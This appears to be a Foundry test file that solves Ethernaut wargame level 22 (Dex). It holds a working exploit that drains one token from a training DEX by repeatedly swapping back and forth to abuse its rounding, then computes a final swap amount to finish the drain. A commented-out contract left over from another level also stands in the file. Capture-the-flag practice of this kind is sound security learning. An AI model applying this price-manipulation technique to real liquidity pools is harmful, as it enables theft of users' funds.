pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function addLiquidity(address addr, uint256 amout) external;

    function approve(address, uint256) external;

    function swap(
        address from,
        address to,
        uint256 amout
    ) external;
}

// contract FakeBuyer {
//     bool queried;

//     function price() external view returns (uint256 result) {
//         return IShop(msg.sender).isSold() ? 0 : 1000;
//     }

//     function buy(IShop shop) external {
//         shop.buy();
//     }
// }

contract Ethernaut22 is EthernautTest {
    constructor() EthernautTest(22) {}

    IDex dex;

    function solve() internal override(EthernautTest) {
        dex = IDex(instance);
        dex.approve(address(dex), type(uint256).max);

        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());

        dex.swap(address(t1), address(t2), t1.balanceOf(address(this)));
        dex.swap(address(t2), address(t1), t2.balanceOf(address(this)));
        dex.swap(address(t1), address(t2), t1.balanceOf(address(this)));
        dex.swap(address(t2), address(t1), t2.balanceOf(address(this)));
        dex.swap(address(t1), address(t2), t1.balanceOf(address(this)));

        // for the last swap, we need to reverse the getSwapPrice call, otherwise we'd overflow
        uint256 desiredAmount = reverseSwapPrice(
            address(t2),
            address(t1),
            t1.balanceOf(address(dex))
        );
        dex.swap(address(t2), address(t1), desiredAmount);
    }

    function reverseSwapPrice(
        address from,
        address to,
        uint256 desiredAmount
    ) public view returns (uint256) {
        return
            (desiredAmount * IERC20(from).balanceOf(address(dex))) /
            IERC20(to).balanceOf(address(dex));
    }
}
